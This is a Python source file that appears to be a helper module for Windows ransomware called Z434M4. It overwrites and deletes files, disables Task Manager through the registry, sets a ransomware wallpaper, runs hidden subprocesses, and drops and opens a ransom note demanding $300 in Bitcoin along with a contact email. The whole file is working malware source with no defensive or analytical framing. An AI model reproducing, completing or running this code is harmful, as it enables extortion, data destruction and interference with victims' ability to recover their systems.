import variables
import base64

import string
import random
import os
import subprocess
import ctypes
import sys
from ctypes import wintypes

def shred(file_name, passes=1):
    """Secure file deletion for Windows"""
    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        return False

    try:
        # Get file size
        ld = os.path.getsize(file_name)
        
        # Overwrite the file with random data
        with open(file_name, "wb") as fh:
            for _ in range(passes):
                data = generate_data(ld).encode('utf-8')
                fh.write(data)
                fh.flush()
                os.fsync(fh.fileno())  # Ensure data is written to disk
        
        # Delete the file
        os.unlink(file_name)
        return True
    except Exception as e:
        print(f"Error shredding file {file_name}: {str(e)}")
        return False

def amiroot(): 
    """Check if running with admin privileges on Windows"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def change_wallpaper():
    """Change desktop wallpaper on Windows"""
    try:
        # Save the ransomware image
        wallpaper_path = os.path.join(variables.ransomware_path, "img.png")
        os.makedirs(os.path.dirname(wallpaper_path), exist_ok=True)
        
        with open(wallpaper_path, 'wb') as f:
            f.write(base64.b64decode(variables.img))
        
        # Use absolute path
        abs_path = os.path.abspath(wallpaper_path)
        
        # Windows API constants
        SPI_SETDESKWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        
        # Change wallpaper using Windows API
        if not ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_path, 
                                                        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE):
            # Fallback method using PowerShell if direct API call fails
            ps_command = f'''
            $code = @'
            using System.Runtime.InteropServices;
            public class Wallpaper {{
                [DllImport("user32.dll", CharSet = CharSet.Auto)]
                public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
            }}
            '@
            Add-Type -TypeDefinition $code
            $SPI_SETDESKWALLPAPER = 0x0014
            $SPIF_UPDATEINIFILE = 0x01
            $SPIF_SENDCHANGE = 0x02
            [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, '{abs_path}', $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
            '''
            
            subprocess.run(['powershell', '-Command', ps_command], 
                          shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        print("[+] Changed desktop wallpaper")
        return True
    except Exception as e:
        print(f"[-] Failed to change wallpaper: {str(e)}")
        return False

def run_subprocess(command):
    """Run a subprocess with hidden window on Windows"""
    startupinfo = None
    if os.name == 'nt':
        # Hide console window on Windows
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
    
    return subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, 
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           startupinfo=startupinfo)

def disable_taskmgr():
    """Disable Task Manager through registry (requires admin)"""
    if not amiroot():
        return False
    
    try:
        import winreg
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(registry_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(registry_key)
        return True
    except:
        return False

def create_ransom_note():
    """Create ransom note on desktop"""
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        note_path = os.path.join(desktop, "RANSOM_NOTE.txt")
        
        # Check if machine_id exists, use a default if not
        machine_id = getattr(variables, 'machine_id', 'UNKNOWN-ID-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)))
        
        with open(note_path, "w") as f:
            f.write("""
YOUR FILES HAVE BEEN ENCRYPTED!

All your files have been encrypted with a strong algorithm.
To decrypt your files, you need the private key which only we possess.

To get your files back, send $300 in Bitcoin to the following address:
[BTC ADDRESS]

After payment, send proof of transfer and your personal ID to:
z434m4.mohamedmahrous@gmail.com

Your personal ID: {}

WARNING:
DO NOT attempt to decrypt files yourself or use third-party software.
This will permanently damage your files.
DO NOT rename encrypted files.
DO NOT delete the Z434M4 program or any related files.
            """.format(machine_id))
            
        # Make ransom note visible by opening it
        os.startfile(note_path)
        return True
    except Exception as e:
        print(f"Error creating ransom note: {str(e)}")
        # Try to write a simpler note if formatting failed
        try:
            with open(note_path, "w") as f:
                f.write("YOUR FILES HAVE BEEN ENCRYPTED! Contact z434m4.mohamedmahrous@gmail.com for recovery.")
        except:
            pass
        return False